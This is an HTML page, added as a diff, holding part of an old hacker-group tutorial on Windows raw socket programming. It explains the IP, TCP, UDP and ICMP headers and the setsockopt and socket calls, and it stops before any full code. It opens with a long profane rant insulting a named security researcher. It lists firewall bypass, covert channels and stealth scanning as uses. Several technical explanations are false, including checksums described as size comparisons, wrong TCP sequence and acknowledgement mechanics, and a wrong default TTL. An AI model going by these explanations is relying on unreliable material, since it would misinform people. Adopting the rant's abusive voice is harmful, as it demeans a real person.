@@ -1,0 +1,1868 @@
+
+<HTML><HEAD><TITLE>Black Sun Research Facility Tutorials - Windows Internet Programming Part 3</TITLE>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<STYLE type=text/css>A:active {
+	TEXT-DECORATION: none
+}
+A:hover {
+	COLOR: #ffffff; TEXT-DECORATION: none
+}
+A:link {
+	TEXT-DECORATION: none
+}
+A:visited {
+	TEXT-DECORATION: none
+}
+.small {
+	FONT-WEIGHT: bold; FONT-SIZE: 9pt; COLOR: #ffffff; FONT-FAMILY: Verdana, Arial, Helvetica, sans-serif
+}
+.small_uppercase {
+	FONT-SIZE: 9pt; COLOR: #999999; FONT-FAMILY: Verdana, Arial, Helvetica, sans-serif
+}
+TD {
+	FONT-SIZE: 9pt; COLOR: #aeaeae; FONT-FAMILY: Verdana, Arial, Helvetica, sans-serif
+}
+.7_ver_b_white {
+	FONT-WEIGHT: bold; FONT-SIZE: 8pt; COLOR: #ffffff; FONT-FAMILY: Verdana, Arial, Helvetica, sans-serif
+}
+
+.white {
+	FONT-WEIGHT: bold; FONT-SIZE: 8pt; COLOR: #ffffff; FONT-FAMILY: Verdana, Arial, Helvetica, sans-serif
+}
+</STYLE>
+
+<META content="MSHTML 6.00.2600.0" name=GENERATOR></HEAD>
+<BODY text=#a7a7a7 vLink=#ff9900 aLink=#ffcc00 link=#ff9900 bgColor=#000000 
+leftMargin=0 topMargin=0 marginheight="0" marginwidth="0">
+
+<BR><BR><PRE><FONT color=red>
+              _________________
+             /_               /\  
+              \/  _______    /  \
+              /  /      /   /   /
+             /  /______/   /   /
+            /           __/   /
+           /  _______   \  __/
+          /  /      /   /  \
+         /  /______/   /   / 
+       _/             /   /      
+      /______________/   /       BLACK SUN RESEARCH FACILITY
+      \              \  /      	   <A href="http://blacksun.box.sk/">http://blacksun.box.sk/</A>
+       \______________\/
+
+
+</FONT>
+
+
+WINDOWS INTERNET PROGRAMMING PART 3
+=================================================
+
+
+
+   WRITTEN BY                 [ <A href="mailto:cos125@hotmail.com">cos125@hotmail.com</A>                :E-MAIL    ]      
+           <A href="mailto:cos125@hotmail.com">BINARY RAPE</A>        [ 114603188                         :ICQ#      ]      
+                              [ <A href="http://blacksun.box.sk/">http://blacksun.box.sk/</A>           :TURORIALS ]      
+
+
+
+
+
+Thanks to cyberwolf for letting me write this and BSRF for releasing it.
+
+
+
+Disclaimer
+=======================================
+
+
+None of the information or code in this tutorial is meant to be used against others
+or to purposely damage computer systems or cause any loss of or damage to property.
+
+Further more neither myself or any other contributor to, or member of, the Blacksun
+research Facility (BSRF) can be held responsible for damage or loss of property of
+computer systems as a result of this tutorial.
+
+In this tutorial the code is provided as a learning aid so you can see how its done
+its not meant for you to use against yourself or others.
+
+Also  you are encouraged to alter the code and improve it. I say create or build a
+program to do something not create or build a program to do something and use it for
+that purpose.
+
+
+CONTENTS
+=======================================
+
+1.  Introduction
+2.  What are Raw Sockets?
+3.  The Internet Headers
+   
+    3.1 The IP Header
+    3.2 The TCP Header
+    3.3 The UDP Header
+    3.4 The ICMP Header
+
+4.  Creating a Packet
+
+    4.1 Setsockopt()
+    4.2 Socket()
+
+5.  Building Headers in code.
+   
+    5.1 The IP Header
+    5.2 The TCP Header
+    5.3 The UDP Header
+    5.4 The ICMP Header
+    5.5 The Psuedo Header
+    5.6 The Checksum Function
+
+6.  Source Code
+
+    6.1 ICMP Echo Request
+    6.2 TCP ACK Packet
+
+
+7.  Recieving Raw Sockets
+8.  Last Words
+
+
+
+
+________________________________________________________________________________________________________
+
+
+
+1.0 INTRODUCTION
+=======================================
+
+Welcome to the 3rd and quite possibly.. the last in this little series
+of ours, its been fun.. kinda..  but never fear there may be one last
+part to come in future covering advanced topics like multicasting and
+we'll always have updates on the tutorials. Of course ive saved the
+best topic for last, Raw Socket programming, and even more so its in
+Windows! A topic which in this place has a certain member of the
+computer security world huffing and yes indeed there is puffing also.
+Head on over to grc.com for more information and listen to him piss his
+pants scared because of raw sockets support in Windows XP...  you see
+Steve Gibson of grc.com believes that because of windows xp's raw
+socket support is available to all users on a windows XP Home Edition
+computer he foresee's the following scenario:
+
+A few kids, it would only take a small group, maybe friends in school,
+they meet each day in a dark little ol' alley at the back of school
+and decide who there next "target" is going to be, they then all
+decide on a time to attack and as Gibson puts it "synchronises their
+watches", then at the decided time they fire up the DoS tools on
+their new copy of windows XP Home Edition and launch their attack upon
+whatever ill-faithed domain name that the kids had decided earlier.
+
+Hmmm....  interesting, well mostly Gibson you focus upon Home Edition
+of windows XP, why? well of course its because of its support for Raw
+Sockets for all users, yes but in your dark and devious example of
+"Junior and his XP gang" you refer to that upgrade the kids would get
+to windows XP home edition well what if they had a copy of Windows XP
+professional or Windows 2000, or even Windows NT for that matter of
+course these other operating systems dont have support for Raw Sockets
+to all its users but if its the kids that are installing these Os's
+wouldn't set up the admin account or give themselves admin priv's?
+then they would have raw socket support anyway. ok Gibson lets give ya
+a little break in fairness Raw Socket support on Home Edition may be
+dangerous and people are of course likely to exploit this feature (no
+Steven it is not a bug it is a feature) and create DDoS tools with it
+but lets look at things, will it really make things bad, will this put
+an end to the threat of DDoS attacks from Windows Systems? Well no
+actually huh! shock horror there is yet still raw socket support on
+systems other than windows xp, Win2k only supports raw sockets for
+admin users, what if some-1 gains admin privilages they could still
+use it hell with NT all you have to do is change an entry in the
+registry, ok lets pull out raw socket support for these 3 operating
+systems all together and we'll be safe right? Well unfortunately Win9x
+systems with Winsock v2.0 also have Raw Socket support limited as it is.
+Thankfully with Windows 9x you can only create ICMP packets... but am..
+theres still a load of things i could do with just ICMP Steveo, I
+could get a subnetmask, ping and traceroute, firewalk, fact of the
+matter is I could even create a trojan with icmp tunneling! and this
+is all without even touching icmp based DoS attacks! Well the answer is
+simple then isn't it Steve all we have to do is pull raw socket support
+from Winsock v2.0, but yes Steve all we have to do is create a dll or
+use an already existing C++ library to create raw socket abilities
+in our applications, you do comment on this in your site saying how it
+doesn't matter because in the past we would have to install new drivers
+and things, wow, do you think that some-1 that really wanted to create
+a DoS attack would be stopped by the need to download 1 more little
+piece, the application could even install any drivers or dll's it
+needed on its own. Yes Steve Gibson, there could be raw socket support
+now on Windows XP computers..  but then again there always was raw
+socket support on all windows boxes if you really looked and yes there
+will be DDoS attacks to come, just like there always would have been
+even without its canned support in windows boxes, also you refered
+to linuxs support for raw sockets as if it didnt matter because of
+the size of its distribution, more and more people are using linux and
+realising its benefits and we are seeing the beginning of "The Linux
+Lamer" 2 words which sadly should never have been mentioned in the
+same sentence, these people could still use DDoS linux tools. What will
+Raw Sockets bring? DDoS tools? certainly, Better firewalls on Windows
+systems? Yes. The availability of security scanners and a wider
+understanding of the internet and its protocols to windows programmers?
+well yup and probably alot more, maybe you are just setting up so much
+hype for the very reason you gave Mr. Gibson sir, You didnt shout out
+when scripting support was added to mail clients, now you can cause
+such a large amount of confusion and fear in people and have alot of
+people shouting no at you that once the very first stupid little DoS
+tool that comes along for windows XP that you can say haha yes! I told
+you so, I was right, you were wrong, but you see the thing is we're not
+saying your wrong, infact, your right, there will be DDoS tools and
+we all know that but all your managing to do is cause fear and confusion
+altough who knows, maybe you just make it your jollies getting people
+to complain and send flames to secure@microsoft.com so that they remove
+raw socket support from windows and you can feel like your a big man
+getting the big bad microsoft empire to do what you want? even the
+security manager at microsoft says:
+
+". . . 'are DDoS attacks going to happen?' Yes. They  
+will happen; and they will happen on Windows XP. "
+
+He is not admitting the great 'flaw' in the Windows XP operating system
+he is being realistic, maybe you should try it it'll be a new experience
+for ya. Any-1 in the computer security field will happily admit, no
+system can be completely secure and things like what your talking about
+will happen, but they don't even need raw socket support to do so.
+Maybe ive been wrong about you all the time maybe you just want to shout
+so much about the damn thing and even pass out source code for such tools
+so that some-1 will come across read your files, get the stuff into their
+head and run along with a hand-full of your little code and propeganda
+and finally design a tool like this, the more publicity you give this
+the more likely such a scenario like this will happen, of course that could
+be your whole point to get whatever it is your after, or it could be that
+if some-1 does design a bad DoS tool microsoft will have to pull the raw
+support and again you can get your jollies from being correct, forgetting
+every-1 that did agree with you but still saw your utter stupidity.
+
+Just to let every-1 know incase they are a bit concerned about Gibson's
+evil Windows XP Raw Socket support, the source code he created using raw
+sockets to show how bad they are doesn't actually work, there was a problem
+in his bind() function, after realising this he stated,
+
+"it's not clear to me what it even means to 'bind' a raw socket"
+
+and of course around the same time hes really getting at microsoft for
+their stupidity and complete lack of security or as you like to phrase it
+" MICROSOFT SECURITY " " The Oxymoron that keeps on giving ".
+
+One of the best things youve said troughout all this was infact:
+
+"a good thing for Windows raw socket security!"
+
+What was that the time you realised you were wrong about microsofts
+security or the time you went out to lunch and SHUT YOUR FUCKING ASS
+FOR 5 MINUTES AND STOPPED WRECKING EVERY-1'S FUCKING HEAD YOU ASSHOLE.
+I am so lucky that unlike people at microsoft.com's security devision
+I don't have to listen to either you or the countless number of people
+that you have scared into doing your bidding by exagerating facts and
+twisting other people's words to give the wrong idea, my hat goes off
+to Greg at Microsoft, personally I couldn't have done the same as he
+has done, not only did he immediately help out Steve with his enquiries
+he even kept steve up to date step by step in reveiwing his concerns.
+Steve quickly returned Greg's hospitality and consideration by insulting
+the amount of work he has done on his behalf and its quality. This
+particular behaviour is probably to be expected i guess from some-1
+who is so egotistical, some-1 that would pretty much say people who say
+its good because its a standard are morons because they are following
+the pack and that its a standard just because some-1 said it is,
+no Steve its a standard because its a part of the standard specification
+for sockets, thats why its supported, 'as standard' if you will by all
+operating systems except from microsoft up to this point. Apparently
+trough it all Gibson just wants a time machine to travel a few years
+back where people still believed like he does that the best security
+is obscurity.
+
+One last point on this subject, The Firewall that comes with versions
+of windows XP, once again 'As Standard' blocks the types of attacks
+that Steve Gibson is describing, you think thats also a good thing
+for microsofts security Steve?
+
+
+So why all the fuss and anger in the last few paragraphs? Taught id
+never shut up didnt ya :P. Well as ive been researching Windows XP's
+raw socket abilities ive been effectively blocked by the constant
+reoccuring pages found concerning Gibsons bullshit and fear spreading
+tactics, after using a total of 8 different combinations of keywords
+and reading many many pages i finally found a grand total of 4
+examples of windows raw socket programs, btw only one of them had
+ever been run on windows XP and im not even sure about that I think
+his code may actually have been run on windows 2000. One of them had
+only been run on a Windows 9x system !! Basically there isn't that much
+documentation to learn from out there in the void so I think it could
+do with me adding a little more, besides few guys flamed me a while back
+on 1 of the channels on box.sk's irc server, (not in #bsrf or #code),
+for saying that there was raw socket support in windows so I kinda
+wrote this for them as well, here ya go guys ;).
+
+So anyway without further delay lets get onto some real substance in
+this tutorial with the most common question of all.
+
+
+2.0 WHAT ARE RAW SOCKETS?
+=======================================
+
+Raw sockets are very similiar to normal sockets but with raw sockets
+you can control the packets that you send better and can control them.
+Raw sockets don't have anything to do with packets themselves they
+are purely a programming concept. You see with normal socket programming
+we would supply a certain amount of information like the ip address we
+were sending it to, the port, the buffer containg the text we were
+sending, and whatever protocol we would be sending it with like TCP or
+UDP, we would supply all this information by filling up structures and
+send the information by calling a couple of functions.
+
+The difference with Raw sockets is that we create our own structures
+for the headers and tell the Winsock that we wanted to use that
+information, now we would fill out these structures with a bit more
+information like our source IP address and fields like the Time To
+Live (TTL) that we discussed in the first part of this tutorial.
+
+using this method we can do many things with the Packets that we use
+like the following:
+
+* Get the Subnetmask from a computer.
+* Bypass firewalls and routers using various methods.
+* Map networks.
+* Send information covertly.
+* Exploit Network Stack vulnerabilities.
+* Perform a stealth port scan.
+* Remote OS identification.
+* Build a firewall.
+
+And theres way more that you could do as well. Until the release of
+Winsock 2.0 Raw Sockets could not be possible unfortunately, Winsock
+1.1 never included the ability which was specified in the Berkeley
+Sockets specification (mostly because microsoft was in a rush to
+release the winsock stack). Luckily even if you dont have Winsock v2
+(which more than likely you will) you can still download version 2.0
+for your version of windows from the microsoft website, windows 3.1
+unfortunately does not have a 2.0 version microsoft has decided not
+to release a 16 bit one. Of course if you have Windows 3.1 what the
+fuck are you doing? suddenly springs to mind, oh well, go away. Now
+Windows32 systems have Winsock however different versions have varying
+amounts of support for raw sockets. All Version 2 stacks have support
+for creating ICMP packets using Raw Sockets but Only Windows NT4, 2000
+and XP have the capability for creating TCP and UDP packets. D'ont
+worry there is still alot of things you can do with ICMP alone if you
+use a Win 9x system. Before we go into the programming side of things
+we must now cover the IP, ICMP, TCP and UDP protocols in more detail.
+If you have read Part 1 of this tutorial you should have a pretty good
+idea about how all the protocols work if not thats ok it shouldn't be
+too bad and you should be able to understand things, so please read
+on for explenations of the Protocols.
+
+
+3.0 THE INTERNET HEADERS
+=======================================
+
+In part 1 we discussed the different Internet protocols and how they
+fit together with packets so you should know pretty well how data is
+transfered across the internet and understand many of the fields
+within the different headers, if you aren't sure or cant quite
+remember I suggest you read the first few sections of Part 1 of this
+tutorial. Well now that you have a pretty good idea about the different
+headers and understand the idea behind them we are going to have to go
+into slightly more detail about the different headers and their
+respective fields.
+
+
+
+3.1 THE IP HEADER
+=======================================
+
+   +---------------------------------+--------------------------------+
+   |Version |  IHL   |     TOS       |         Total Length           |
+   | 4 bits | 4 bits |    8 bits     |            16 bits             |
+   +--------+--------+---------------+------+-------------------------+
+   |        Identification           |Flags |     Fragment Offset     |
+   |            16 bits              |3 bits|         13 bits         |
+   +-----------------+---------------+------+-------------------------+
+   |  Time to Live   |   Protocol    |        Header Checksum         |
+   |      8 bits     |    8 bits     |             16 bits            |
+   +-----------------+---------------+--------------------------------+
+   |                        Source Address                            |
+   |                            32 bits                               |
+   +------------------------------------------------------------------+
+   |                      Destination Address                         |
+   |                            32 bits                               |
+   +------------------------------------------------+-----------------+
+   |                     Options                    |     Padding     |
+   +------------------------------------------------+-----------------+
+
+   FIG 1.0  - Structure of an IP Header
+
+
+As you can see above the IP header has a total of 14 Fields.
+
+1.  Version
+2.  IHL
+3.  TOS
+4.  Total Length
+5.  Identification
+6.  Flags
+7.  Fragment Offset
+8.  Time To Live
+9.  Protocol
+10. Header Checksum
+11. Source Address
+12. Destination Address
+13. Options
+14. Padding
+
+
+1.  Version		- The version field describes what version of the IP Protocol
+			  is being used, we will be using IPv4 because it is more
+			  supported and IPv6 is not yet fully implemented.
+
+2.  IHL			- The Internet Header Length (IHL) contains the length of the
+			  Internet Header in 32 bit words. Minimum value for a header
+			  is 5.
+
+3.  TOS			- The Type Of Servive (TOS) field was designed to tell routers
+			  how the packet is to be handled for example so that packets
+			  that need to move quickly like streaming audio would have a
+			  higher TOS value than other packets so that routers would
+			  send them across the network faster. These days most routers
+			  do not process the TOS field because it would waste too much
+			  of the routers time so we usually just set the TOS field to
+			  0.
+
+4.  Total Length 		- This field contains the total size of the Internet Packet
+			  including headers and data. Typical IP headers are 20 bytes
+			  in size, same with TCP ones, so an Internet Packet with an
+			  IP Header, a TCP Header and no data would be 20 + 20 = 40
+			  bytes in length, Total Length = 40 Bytes.
+
+5.  Identification		- This field is used to aid in tracking fragmented packets,
+			  each fragment has the same ID as the first datagram, the
+			  ID's of datagrams following each other is usually
+			  incremented, because this value must be unique most
+			  applications use there process id to fill in this field.
+
+6.  Flags			- Flags are used with IP to control fragmentation, there are
+			  4 flags.
+
+
+			1-NO FLAGS		       [VALUE = 0x00]
+
+			  Does not specify any fragmentation options
+
+			  		     
+
+
+			2-MORE FRAGMENT		       [VALUE - 0X01]
+
+			  Means there is more fragments to be
+			  recieved after this packet
+
+			  		     
+
+
+			3-DONT FRAGMENT		       [VALUE = 0X02]
+
+			  Tells the stack not to fragment this packet
+
+			
+			4-MORE & DONT		       [VALUE = 0X03]
+
+			  Tells the stack that there are more packets
+			  to be recieved after this one and not to
+			  fragment it
+
+			  		     
+
+
+		    NOTE: THE LAST FRAGMENT CANNOT HAVE A FLAG OF 0X01 (MORE FRAG)
+			  AS THERE ARE NO OTHER PACKETS TO FOLLOW.
+
+
+
+7.  Fragment Offset	- The fragment offset is used for placing different packets
+			  in the correct order when reassembling Datagrams. The first
+			  fragment must have a value of 0 and the last must be equal
+			  to the value of Total Length. Value is measured in units of
+			  64 bits (8 octets).
+
+8.  Time To Live	- The Time To Live (TTL) field was created so that if a packet
+			  cannot find its destination it will be destroyed rather than
+			  travel across the internet indefinately, if packets kept
+			  mounting in this fashion it would seriously degrade network
+			  performance. Each router that a packet meets decrements the
+			  value of the TTL field by one. If the value is decremented
+			  to 0 before it reaches its destination the packet will be
+			  destroyed and an error sent back to the computer that the
+			  packet originated from. If the TTL is set to 0 on creation
+			  it will immediately be destroyed.
+
+9.  Protocol		- This field specifies what protocol is being carried in the
+			  datagram eg; TCP.
+
+			  The most common values are as follows:
+
+			  IPPROTO_TCP	= TCP
+			  IPPROTO_UDP	= UDP
+			  IPPROTO_ICMP	= ICMP
+
+			  Other protocols and there values will be specified later.
+
+10. Header Checksum	- The checksum is the size of the Internet Header, it is used
+			  to verify the integrity of a packet by comparing the headers
+			  size with the value of the checksum. Certain fields in the
+			  IP Header change troughout transport such as the TTL field
+			  because of this the checksum is recalculated and verified
+			  by each router or gateway it encounters.
+
+11. Source Address		- The IP Address of the computer that the packet originated
+			  from. In other words if you sent a packet this field would
+			  contain your IP Address. This lets the computer being sent
+			  the packet know where it came from and where to send a reply.
+
+12. Destination Address 	- The IP Address of the computer that the packet is being sent.
+			  Lets routers that the packet meets know where to send the
+			  packet to.
+
+13. Options		- Mostly the options aren't filled out and they are very rarely
+			  used at all so we wont discuss them very much. There are
+			  however 3 interesting options that we will discuss here,
+			  they are:
+
+			  1. Loose Source Routing
+			  2. Strict Source Routing
+			  3. Record Routing.
+
+			  1. Loose Routing
+			  
+			  Loose Routing allows us to specify the source computer (us)
+			  and the destination computer's IP Address's in the IP
+			  header along with the address's of a couple of other routers
+			  that the packet must travel across between, then we can
+			  better control how the packet travels across the internet.
+
+			  2. Strict Routing
+
+			  Strict Routing allows us to specify the source computer (us)
+			  and the destination computer's IP Address's in the IP
+			  header along with the address's of other routers, the packet
+			  then has to travel along this exact route to get to its
+			  destination, using this we can route our packets around
+			  routers or gateways that are down or not responding, this
+			  also means that if you wanted to you could ensure that the
+			  packet travels across certain networks and passes certain
+			  routers, of course this isn't recommended as you could
+			  'accidentaly' bypass security restrictions on some networks
+			  by using this method, which is naughty.
+
+			  3. Record Routing
+
+			  Im sure we are all familiar with the traceroute program
+			  which uses the ICMP protocol to tell us what routers our
+			  packets are traveling trough to get to there destination,
+			  record routing can be used ina  similiar way, by setting
+			  this option every router that the packet meets places its
+			  IP Address into the IP Header, we can then examine the packet
+			  and see what IP Address's it contains.
+
+		    NOTE: AN IP HEADER CAN ONLY BE A MAXIMUM OF 60 BYTES LONG AND THE
+			  HEADER IS 20 BYTES IN LENGTH, EACH IP ADDRESS IS 4 BYTES IN
+			  SIZE SO AN IP HEADER CAN ONLY CONTAIN A MAXIMUM OF 10 IP
+			  ADDRESS'S EACH.
+
+
+14. Padding		- Padding is there to respect the 32 bits boundary, its composed
+			  of 0's.
+
+
+
+3.2 THE TCP HEADER
+=======================================
+
+Well before we get into the TCP header we first have to explain how exactly a TCP connection
+is formed between two hosts. The First host sends a TCP packet with one of the fields in the
+header set with a value of SYN, this is known as a SYN (synchronise) packet. So what is this
+packet synchronising? A potential problem with a TCP connection would be  if a connection was
+established between some internet user at home and a shop on the internet, the user views his
+details but in the mean time some-1 were to pretend they were that user and the webshop sent
+that users details to that person instead of the real user (such as the real users credit
+card numbers?). Because of this a thing called an acknowledgement number was created, the
+number is defined by the server and the syn packet is used to transmit this number to the
+host, both sides of the connection now have the same Acknowledgement number and they are
+synchronised! The Acknowledgement number will be contained in all TCP packets troughout this
+session and if any packets recieved at either side have a wrong Acknowledgement number then
+the packet will be discarded.
+
+The second host will now send another TCP packet this time with a field set to ACK
+(Acknowledge) this is known as a SYN_ACK packet. Its purpose is to acknowledge the reception
+of the SYN packet.
+
+Once the first host has recieved the SYN_ACK packet it sends one last ACK packet, just to be
+sure to be sure.
+
+As you can see this process involves 3 steps.
+
+1. Host sends SYN packet to target start a connection
+2. Target sends host an ACK packet saying it recieved the SYN.
+3. Host sends target an ACK packet to confirm and connection is established.
+
+Because of these 3 steps the TCP connection is known as the Three-Way-Handshake.
+
+
+
+   +---------------------------------+--------------------------------+
+   |          Source Port            |       Destination Port         |
+   |            16 bits              |           16 bits              |
+   +---------------------------------+--------------------------------+
+   |                          Sequence Number                         |
+   |                              32 bits                             |
+   +------------------------------------------------------------------+
+   |                      Acknowledgment Number                       |
+   |				  32 bits			      |
+   +--------+------------+-----------+--------------------------------+
+   |D-Offset|  Reserved  | Ctrl Bits |   	   Window               |
+   | 4 bits |   6 bits   |   6 bits  |	   16 bits              |
+   +--------+------------+-----------+--------------------------------+
+   |            Checksum             |        Urgent Pointer          |
+   |             16 bits             |            16 bits             |
+   +---------------------------------+--------------+-----------------+
+   |                     Options                    |     Padding     |
+   +------------------------------------------------+-----------------+
+   |				Data			      |
+   +------------------------------------------------------------------+
+
+
+   FIG 1.1  - Structure of a TCP Header
+
+
+There are 12 fields in total in the TCP Header and your Datagram.
+
+1.  Source Port
+2.  Destination Port
+3.  Sequence Number
+4.  Acknowledgement Number
+5.  Data Offset
+6.  Reserved
+7.  Control Bits
+8.  Window
+9.  Checksum
+10. Urgent Pointer
+11. Options
+12. Padding
+
+
+
+1.  Source Port		- The Source port number.
+
+2.  Destination Port	- The Destination port number.
+
+3.  Sequence No.		- The sequence number is used to ensure that segments
+			  recieved by a host are from where they claim to be,
+			  this prevents people from hijacking connections.
+
+4.  Acknowledgement No. 	- The acknowledgement number to ensure both sides of
+			  the connection are authentic, as explained above.
+
+5.  Data Offset		- The Data Offset in the header is expressed in 32 bit
+			  words. The default is 5 if you have no options set
+			  in the TCP header.
+
+6.  Reserved		- This field is reserved for future use, you must have
+			  it set to 0.
+
+7.  Control Bits		- This is the field that contains values such as SYN
+			  and ACK. It has a total of 6 values.
+
+    		    	  URG:  Send Urgent Data to destination.
+    		    	  ACK:  Acknowledgment of Data.
+    			  PSH:  Push Data to destination.
+    			  RST:  Reset the connection.
+    			  SYN:  Synchronize sequence numbers.
+    			  FIN:  No more data from sender.
+
+8.  Window		- Specifies the maximum size of a segment that you can
+			  accept, if the segment is larger than this then it
+			  must be fragmented.
+
+9.  Checksum		- The TCP checksum just like we explained with the IP
+			  header, is to ensure that there is no loss of Data
+			  during transport, it gets the size of the packet and
+			  when it gets to the host the host compares the size
+			  of the packet with the value of the checksum and if
+			  they dont match you can see the packet was mangled
+			  during transport.
+
+			  The TCP Checksum is calculated using a psuedo header
+			  which is prefixed to the TCP Header. The purpose of
+			  this Psuedo Header is to protect the TCP packet from
+			  misrouted segments. The Psuedo Header contains 4
+			  main pieces of information, the Source IP, the
+			  Destination IP numbers, the protocol and the TCP
+			  length.
+
+
+   			  +-----------------------------------+
+   			  |           Source Address          |
+   			  +-----------------------------------+
+   			  |         Destination Address       |
+   			  +--------+--------+--------+--------+
+   			  |  zero  |  PTCL  |    TCP Length   |
+   			  +--------+--------+--------+--------+
+
+			  FIG 1.3  - The structure of a Psuedo Header
+
+
+			  The TCP Length field is the length of the TCP Header
+			  + length of the Data and does not count the length of
+			  the Psuedo Header (12 Bytes).
+
+10. Urgent Pointer	- This field is only to be set when the URG control bit
+			  is set. It points to a Data area.
+
+11. Options		- The TCP options field is very similiar to the IP Options
+			  field except it has fewer interesting parts that need
+			  to be mentioned here...  none.
+
+12. Padding		- The same as the IP Padding Field.
+
+
+
+
+3.3 THE UDP HEADER
+=======================================
+
+   +---------------------------------+--------------------------------+
+   |          Source Port            |       Destination Port         |
+   |            16 bits              |           16 bits              |
+   +---------------------------------+--------------------------------+
+   |            Length               |           Checksum             |
+   |            16 bits              |           16 bits              |
+   +---------------------------------+--------------------------------+
+
+   FIG 1.4  - The Structure of a UDP Header
+
+The UDP Header is more basic than previous Headers, it has only 4 fields.
+
+1. Source Port
+2. Destination Port
+3. Length
+4. Checksum
+
+
+1.  Source Port		- Same as in TCP.
+
+2.  Destination Port	- Same as in TCP.
+
+3.  Length		- The length of the Datagram, including UDP Header and
+			  Data. Size must be at least 8.
+
+4.  Checksum		- Same as TCP this field protects against misrouted packets
+			  it also uses the same Psuedo Header as TCP.
+
+
+
+3.4 THE ICMP HEADER
+=======================================
+
+   +----------------+----------------+--------------------------------+
+   |      Type      |     Code       |           Checksum             |
+   |     8 bits     |    8 bits      |           16 bits              |
+   +----------------+----------------+--------------------------------+
+   |                              Unused                              |
+   |                              32 bits                             |
+   +------------------------------------------------------------------+
+   |            Internet Header + 64 bits of Original Data            |
+   |                              32 bits                             |
+   +------------------------------------------------------------------+
+
+   FIG 1.5  - The Standard Structure of an ICMP Header
+
+The ICMP Header changes depending on the message it is sending. Different
+ICMP Messages are conveyed by combinations of different values and the
+Unused Field can contain different values and become used depending upon
+the different ICMP messages being sent. For example in some messages you
+may need to specify the general Type of message and then its code, this
+certain message may require additional information such as the IP Address
+of a computer, this address would then be stored in the Unused Field.
+
+The ICMP protocol is similiar to UDP in that it is used in messages of 1
+Datagram in size, however, ICMP is more like an extension of IP and certain
+fields must also be set for use with ICMP.
+
+
+The Standard ICMP Header has 4 main fields.
+
+1. Type
+2. Code
+3. Checksum
+4. Unused
+
+
+1.  Type		- Field declaring the type of ICMP Message.
+
+2.  Code		- Field specifying the messages code to identify its
+			  meaning.
+
+3.  Checksum	- Calculated the same as other headers, the kernel may pad
+			  this if the checksum is an odd number to respect 32 bit
+			  boundaries in most ICMP messages but Checksum is not
+			  calculated in some ICMP Messages.
+
+4.  Unused	- The value of this field varies depending on the type of
+			  ICMP message, if no value is to be entered in this field
+			  it must be specified as 0.
+
+
+There are several different ICMP messages but here we are only going to refer
+to the 2 most interesting types Echo and Netmask request and reply's.
+
+======================
+Echo Request and Reply
+======================
+
+Description:
+
+These two ICMP Messages are commonly used in conjunction to form
+the ping program. First we send an Echo Request to a host and
+that host then sends us an echo reply. By sending multiple requests
+to a host and comparing the time they were sent with the time that
+the Echo Reply was recieved we can calculate the mean time that
+packets are sent between us and that host. This Message is also
+useful to determine whether a host is reachable and connected to the
+internet or not.
+
+Data can be inserted into an Echo request, perhaps for checking
+the integrity of a packet which it is returned?
+
+
+Type:
+
+Echo Request	= 8
+Echo Reply 	= 0
+
+
+Code:
+
+Field Unused	= 0
+
+
+Checksum:
+
+As specified above.
+
+
+Identifier:
+
+Same as the IP Identifier, useful to determine which ICMP Echo Reply
+belongs to which Echo Request.
+
+
+Sequence Number:
+
+Used in the same way as the Identifier is above, useful for matching
+Echo Reply's with Requests.
+
+====================================================================
+
+=========================
+Netmask Request and Reply
+=========================
+
+Description:
+
+We can send a netmask request to a host and it will return a netmask
+reply containing its subnetmask, getting subnetmasks is useful for
+mapping out and gathering information on network topology.
+
+
+Type:
+
+Netmask Request	= 17
+Netmask Reply	= 18
+
+
+Code:
+
+Field Unused	= 0
+
+
+Checksum:
+
+Same as above.
+
+
+Identifier:
+
+Same as the IP Identifier, useful to determine which ICMP Netmask
+Reply belongs to which Netmask Request.
+
+
+Sequence Number:
+
+Used in the same way as the Identifier is above, useful for matching
+Netmask Reply's with Requests.
+
+====================================================================
+
+
+
+4.0 CREATING A PACKET
+=======================================
+
+OK well thats enough Protocol Header theory, lets look at how we are
+going to construct a raw socket in code and the differences between
+coding raw sockets and normal windows sockets code.
+
+Now with normal Sockets we give certain information to the stack in
+the case of windows, the Winsock. This information comprises of things
+like what transport layer were gonna use, TCP or UDP, the address of
+the host we are going to send it to, the port for it to go to, the
+Data to be contained within the Datagram, we name the socket call
+the sendto() function and off it goes. What we should consider now
+is what then happens to the information that we just provided, we know
+how the IP protocol sends it off zooming across the internet and how
+the host handles and sends this Data, but what happens inbetween the
+time we called sendto() and the time that packet leaves our computer?
+
+Well we passed this information to the winsock, the winsock then
+takes information such as the Destination address and our own address
+along with the protocol we specified and fills out the relevant
+fields in the protocol header, it then sets the TTL with its own
+default value of 35.
+
+Then the winsock uses the other information we provided, the source
+and destination port numbers, and fills the relevant TCP or UDP
+Header fields, and constructs the header, wraps the headers around
+the Data we specified and calculates things such as fragmentation
+and fills in the fields. Once everything is filled out and wrapped
+up the winsock calculates the size of the packet and specifies the
+checksum value.
+
+With all this done the winsock sends the packet off to whiz around
+the internet.
+
+So with normal sockets we dont have to specify all those nasty fields
+in the Headers we leave it up to good ol' winsock and it handles that
+but we want to create our own headers so how do we stop the winsock
+from prefixing its headers onto our packet?
+
+
+4.1 SETSOCKOPT()
+=======================================
+
+The setsockopt() function is very important in raw sockets, its here
+that we tell the winsock that we want to use our own headers for this
+packet and for it to not add its own to ours.
+
+The setsockopt() function has 5 parameters:
+
+1. Socket
+2. Level
+3. Option Name
+4. Option value
+5. Option Length
+
+
+1. Socket		- Just like in normal sockets this is a Socket
+		 	  that we made earlier in the program.
+
+2. Level		- This is the protocol we are going to be using
+		 	  in the program, it has values such as
+		 	  IPPROTO_TCP and IPPROTO_IP.
+
+3. Option Name		- The socket option we are going to set, we will
+			  be setting this to IP_HDRINCL, this option is
+			  what tells the winsock we want to include our
+			  own headers for the packet.
+
+4. Option Value		- Pointer to the buffer in which the value for
+			  the requested option is supplied. We will be
+			  using a boolean called bOpt set to true for
+			  this, set to false would mean that we dont want
+			  to use the IP_HDRINCL option.
+
+5. Option Length	- The size of the buffer which supplies the
+			  value. We will use sizeof(bOpt) for this.
+
+
+The setsockopt() function well be looking at so will look like this:
+
+setsockopt(myraw, IPPROTO_IP, IP_HDRINCL, (char *)&bOpt, sizeof(bOpt)
+
+
+So now how do we tell the winsock that we want to use raw sockets
+instead of normal sockets in the first place?
+
+
+4.2 SOCKET()
+=======================================
+
+Of course weve already covered the socket() function in the past and
+are familiar with its different parameters but what we have to be
+concerned about two of its parameters, its type and protocol.
+
+A normal socket looks like the following:
+
+socket(AF_INET, SOCK_STREAM, 0)
+
